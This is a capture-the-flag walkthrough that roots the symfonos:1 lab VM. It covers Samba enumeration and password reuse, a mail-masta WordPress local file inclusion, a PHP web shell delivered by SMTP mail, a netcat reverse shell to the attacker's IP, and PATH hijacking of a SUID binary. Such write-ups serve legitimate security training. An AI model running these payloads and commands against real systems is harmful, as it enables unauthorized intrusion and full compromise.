Before scanning the machine, the creator said that we may need to update our host file to symfonos.local, so we add '10.0.0.20 symfonos.local' to the hosts file.

root@kali ~/D/C/SYMFONOS#1# nmap -sS -A -T4 -p- 10.0.0.20

22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:DF:88:1A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

We can see the open shares on Samba:

root@kali ~/D/C/SYMFONOS#1# smbclient -L //10.0.0.20/

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

root@kali ~/D/C/SYMFONOS#1# smbclient //10.0.0.20/anonymous
Enter WORKGROUP\root's password: 
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

By going to the anonymous share we can read the attention.txt file:

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

Now that we some passwords let's try accessing helios share with the helios user.

root@kali ~/D/C/SYMFONOS#1# smbclient //10.0.0.20/helios -U helios
Enter WORKGROUP\helios's password: qwerty
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Wed Feb  2 14:56:32 2022
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 16902192 blocks available
smb: \> 
 
todo.txt:

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

The research.txt file doesn't have any useful information but the todo list shows us the there is a directory on the webserver named "h3l105". after going to http://symfonos.local/h3l105/ we can see that is a Wordpress site, we can use "wpscan".

root@kali ~/D/C/SYMFONOS#1# wpscan --url http://symfonos.local/h3l105/ --enumerate ap,vt,u

"wpscan" found some really useful information, the user admin is avaialble, I tried brute forcing the password but it didn't work. We also found that the site has 2 plugins:

site-editor
mail-masta

root@kali ~/D/C/SYMFONOS#1# searchsploit -m php/webapps/40290.txt

Turns out mail-masta allows Directory Traversal, through that we can do a Local File Inclusion (When an application uses a file path as an input, some sites treats that input as trusted and safe. A local file can then be injected into the included statement). 

40290.txt:
Typical proof-of-concept would be to load passwd file:


http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Going to http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd we can see that the user "helios" is a user on the machine.
At this point I got a little stuck, I searched online for "Local File Inclusion remote command execution" and found out that if we can upload to a file on the machine this php script ---> <?php system($_GET['c']); ?> we can perform remote code execution on the machine. I went back to the NMAP scan and saw port 25 is open, maybe we can send a mail and open it using the Local File Inclusion expliot and perform remote execution.

root@kali ~/D/C/SYMFONOS#1# telnet 10.0.0.20 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
mail from: <hacker>
250 2.1.0 Ok
rcpt to: helios@symfonos.localdomain
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 9A174408A4

Going to http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios we can read our sent email, trying to run the "whoami" command we can see that we are the "helios" user.

Setting up a listener on our local machine we can connet via a reverse shell to the remote machine.

symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/bash 10.0.0.27 4444

root@kali ~/D/C/SYMFONOS#1# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.0.27] from (UNKNOWN) [10.0.0.20] 53434

We can get a better shell using ---> python2 -c 'import pty; pty.spawn("/bin/bash")'

Going to the home folder there is only the share that we already enumerated on Samba. Let's try to find SUID files.

helios@symfonos:/home/helios$ find / -perm /4000 2> /dev/null

There is one odd file ---> /opt/statuscheck. 
/opt/statuscheck:

helios@symfonos:/home/helios$ /opt/statuscheck
HTTP/1.1 200 OK
Date: Thu, 03 Feb 2022 16:51:56 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html

After running the command it seems to be outputing a response to a webserver, probably by using the "curl" command.

helios@symfonos:/home/helios$ strings /opt/statuscheck
...
curl -I H
http://lH
ocalhostH
...

Using the strings command we can confirm that the "curl" command is being used. We can try to change the PATH variable and create a file name curl that opens a new shell.

helios@symfonos:/home/helios$ echo '/bin/bash' >> /tmp/curl
helios@symfonos:/home/helios$ ls /tmp
curl

helios@symfonos:/tmp$ export PATH=/tmp
helios@symfonos:/tmp$ /opt/statuscheck
# 
# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

We can go the /root directory and read the proof.txt file.

proof.txt

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!


